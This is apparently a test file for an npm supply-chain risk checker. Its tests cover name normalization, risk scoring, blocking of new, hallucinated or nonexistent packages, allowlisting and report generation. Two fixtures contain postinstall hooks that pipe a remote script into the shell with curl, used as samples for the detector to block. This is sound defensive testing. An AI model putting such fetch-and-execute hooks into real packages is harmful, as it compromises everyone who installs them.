import fs from 'node:fs';
import path from 'node:path';
import os from 'node:os';
import { fileURLToPath } from 'node:url';
import { spawnSync } from 'node:child_process';
import test from 'node:test';
import assert from 'node:assert/strict';
import { preprocessRequest } from '../src/preprocessor.js';
import { extractFeatures } from '../src/feature-extractor.js';
import { scoreWithRuleEngine } from '../src/trust-engine.js';
import { decidePackageRisk } from '../src/decision-engine.js';
import { evaluateInstallSpec } from '../src/sandbox.js';
import { generatePdfReport } from '../src/report.js';

const cliPath = path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'src', 'cli.js');

test('preprocessRequest normalizes scoped package and dist-tag', () => {
  const request = preprocessRequest({ spec: '  @Scope/Name@latest  ', ecosystem: 'npm' });
  assert.equal(request.valid, true);
  assert.equal(request.full_name, '@scope/name');
  assert.equal(request.resolved_tag, 'latest');
  assert.equal(request.resolved_via_unpinned_tag, true);
});

test('rule engine scores suspicious install scripts and new package age', () => {
  const metadata = {
    first_publish_timestamp: new Date(Date.now() - 2 * 24 * 60 * 60 * 1000).toISOString(),
    publish_timestamp: new Date(Date.now() - 2 * 24 * 60 * 60 * 1000).toISOString(),
    version_publish_timestamps: [new Date(Date.now() - 2 * 24 * 60 * 60 * 1000).toISOString()],
    lifecycle_scripts: {
      postinstall: 'curl https://example.com | sh'
    },
    dependency_version_ranges: [
      { name: 'left-pad', range: '^1.0.0' },
      { name: 'other', range: '*' }
    ],
    dependency_count: 2,
    has_bin_entry: true,
    downloads: { weekly: 4 },
    provenance: { present: false },
    provenance_history: [{ version: '0.0.1', present: true }]
  };

  const request = {
    resolved_tag: 'latest',
    nearest_popular_distance: 2,
    nearest_hallucination_distance: 1
  };

  const osvResult = { unavailable: false, knownCveCount: 0, maxSeverity: 0 };
  const extracted = extractFeatures({ metadata, request, osvResult });
  const scored = scoreWithRuleEngine(extracted.featureVector);

  assert.ok(scored.value > 0.3);
  assert.ok(extracted.completeness > 0.5);
  assert.equal(extracted.featureVector.lifecycle_script_risk, 1);
});

test('policy blocks a new package with a shell downloader', () => {
  const metadata = {
    first_publish_timestamp: new Date(Date.now() - 24 * 60 * 60 * 1000).toISOString(),
    publish_timestamp: new Date(Date.now() - 24 * 60 * 60 * 1000).toISOString(),
    version_publish_timestamps: [],
    lifecycle_scripts: { postinstall: 'curl https://example.test/setup.sh | sh' },
    dependency_version_ranges: [],
    dependency_count: 0,
    has_bin_entry: false,
    downloads: { weekly: 20, available: true },
    provenance: { present: false },
    provenance_history: []
  };
  const extracted = extractFeatures({
    metadata,
    request: { resolved_tag: 'pinned', nearest_popular_distance: 8, nearest_hallucination_distance: 8 },
    osvResult: { unavailable: false, knownCveCount: 0, maxSeverity: 0 }
  });
  const scored = scoreWithRuleEngine(extracted.featureVector, extracted.availability);
  const decision = decidePackageRisk({
    riskScore: scored.value,
    breakdown: scored.breakdown,
    completeness: extracted.completeness,
    availability: extracted.availability,
    featureVector: extracted.featureVector,
    existenceCheck: { status: 'exists' },
    osvResult: { malicious: false }
  });

  assert.equal(extracted.featureVector.lifecycle_script_risk, 1);
  assert.equal(decision.action, 'BLOCK');
  assert.equal(decision.policy_rule, 'new_package_with_install_script');
});

test('policy recognizes node setup scripts as install-time execution', () => {
  const metadata = {
    first_publish_timestamp: new Date(Date.now() - 2 * 24 * 60 * 60 * 1000).toISOString(),
    publish_timestamp: new Date(Date.now() - 2 * 24 * 60 * 60 * 1000).toISOString(),
    version_publish_timestamps: [],
    lifecycle_scripts: { postinstall: 'node ./setup.js' },
    dependency_version_ranges: [],
    dependency_count: 0,
    has_bin_entry: false,
    downloads: { weekly: 20, available: true },
    provenance: { present: false },
    provenance_history: []
  };
  const extracted = extractFeatures({
    metadata,
    request: { resolved_tag: 'pinned', nearest_popular_distance: 8, nearest_hallucination_distance: 8 },
    osvResult: { unavailable: false, knownCveCount: 0, maxSeverity: 0 }
  });

  assert.equal(extracted.featureVector.lifecycle_script_risk, 1);
});

test('policy blocks a registered hallucination typo with low downloads', () => {
  const featureVector = {
    package_age_risk: 0.2,
    lifecycle_script_risk: 0,
    name_similarity_risk: 0.75,
    hallucination_corpus_risk: 1,
    popularity_risk: 0.9
  };
  const breakdown = scoreWithRuleEngine(featureVector, {
    package_age_risk: true,
    lifecycle_script_risk: true,
    name_similarity_risk: true,
    hallucination_corpus_risk: true,
    popularity_risk: true
  });
  const decision = decidePackageRisk({
    riskScore: breakdown.value,
    breakdown: breakdown.breakdown,
    completeness: breakdown.completeness,
    availability: {
      popularity_risk: true
    },
    featureVector,
    existenceCheck: { status: 'exists' },
    osvResult: { malicious: false }
  });

  assert.equal(decision.action, 'BLOCK');
  assert.equal(decision.policy_rule, 'registered_hallucination_typosquat');
});

test('decision engine blocks nonexistent packages immediately', () => {
  const decision = decidePackageRisk({
    riskScore: 0.1,
    breakdown: [],
    completeness: 1,
    existenceCheck: { status: 'missing_package' },
    osvResult: { malicious: false }
  });

  assert.equal(decision.action, 'BLOCK');
  assert.equal(decision.confidence, 1);
  assert.equal(decision.reason, 'blocked: nonexistent_package');
});

test('sandbox gate allows known-good packages for install', async () => {
  const safePackages = ['react', 'lodash', 'express', 'chalk'];

  for (const packageName of safePackages) {
    const decision = await evaluateInstallSpec(packageName, { timeoutMs: 15000 });
    assert.equal(decision.action, 'ALLOW', `expected ${packageName} to be allowed`);
    assert.ok(decision.confidence >= 0 && decision.confidence <= 1, `invalid confidence for ${packageName}`);
    assert.equal(decision.reason.length > 0, true);
  }
});

test('report generation works for multiple known-good package decisions', async () => {
  const outputDir = fs.mkdtempSync(path.join(os.tmpdir(), 'pact-report-'));
  const outputFile = path.join(outputDir, 'report.pdf');
  const summary = await generatePdfReport([
    {
      decision: 'ALLOW',
      requested_package: { name: 'react', version: null, ecosystem: 'npm' },
      risk_score: 0.2,
      confidence: 0.75,
      reason: 'ALLOW: no major signals'
    },
    {
      decision: 'ALLOW',
      requested_package: { name: 'lodash', version: null, ecosystem: 'npm' },
      risk_score: 0.18,
      confidence: 0.78,
      reason: 'ALLOW: well-known package'
    },
    {
      decision: 'ALLOW',
      requested_package: { name: 'express', version: null, ecosystem: 'npm' },
      risk_score: 0.17,
      confidence: 0.8,
      reason: 'ALLOW: stable metadata'
    }
  ], outputFile);

  assert.equal(summary.outputPath, outputFile);
  assert.equal(fs.existsSync(outputFile), true);
  assert.match(fs.readFileSync(outputFile, 'latin1'), /^%PDF/);
});

test('CLI check reports multiple known-good packages cleanly', () => {
  const result = spawnSync(
    process.execPath,
    [cliPath, 'check', 'react', 'lodash', 'express', 'chalk', '--json'],
    { encoding: 'utf8' }
  );

  assert.equal(result.status, 0);
  const parsed = JSON.parse(result.stdout);
  assert.equal(parsed.decision, 'ALLOW');
  assert.equal(parsed.results.length, 4);
  for (const decision of parsed.results) {
    assert.equal(decision.decision, 'ALLOW');
    assert.ok(decision.confidence >= 0 && decision.confidence <= 1);
  }
});

test('npm install --dry-run reports the decision but never spawns a real npm install', () => {
  const cwd = fs.mkdtempSync(path.join(os.tmpdir(), 'pact-dry-run-'));

  const result = spawnSync(
    process.execPath,
    [cliPath, 'npm', 'install', 'some-totally-nonexistent-pkg-xyz123', '--dry-run'],
    { cwd, encoding: 'utf8' }
  );

  assert.equal(fs.existsSync(path.join(cwd, 'node_modules')), false);
  assert.equal(fs.existsSync(path.join(cwd, 'package-lock.json')), false);
  assert.match(result.stdout, /BLOCK/);
  assert.doesNotMatch(result.stdout, /added \d+ package/);
});

test('allowlist bypasses a private package without registry analysis', () => {
  const cwd = fs.mkdtempSync(path.join(os.tmpdir(), 'pact-allowlist-'));
  const allowlistFile = path.join(cwd, 'allowlist.json');
  const env = { ...process.env, PACT_ALLOWLIST_FILE: allowlistFile };

  const add = spawnSync(
    process.execPath,
    [cliPath, 'allow', 'add', '@company/internal-sdk'],
    { cwd, env, encoding: 'utf8' }
  );
  assert.equal(add.status, 0);

  const install = spawnSync(
    process.execPath,
    [cliPath, 'npm', 'install', '@company/internal-sdk', '--dry-run', '--json'],
    { cwd, env, encoding: 'utf8' }
  );
  assert.equal(install.status, 0);
  const parsed = JSON.parse(install.stdout);
  assert.equal(parsed.decision, 'ALLOW');
  assert.equal(parsed.results[0].decision, 'BYPASS');
  assert.equal(parsed.results[0].risk_score, null);
  assert.equal(parsed.results[0].confidence, null);
  assert.match(parsed.results[0].reason, /explicit_user_allowlist/);

  const list = spawnSync(
    process.execPath,
    [cliPath, 'allow', 'list'],
    { cwd, env, encoding: 'utf8' }
  );
  assert.equal(list.stdout.trim(), '@company/internal-sdk');

  const remove = spawnSync(
    process.execPath,
    [cliPath, 'allow', 'remove', '@company/internal-sdk'],
    { cwd, env, encoding: 'utf8' }
  );
  assert.equal(remove.status, 0);
});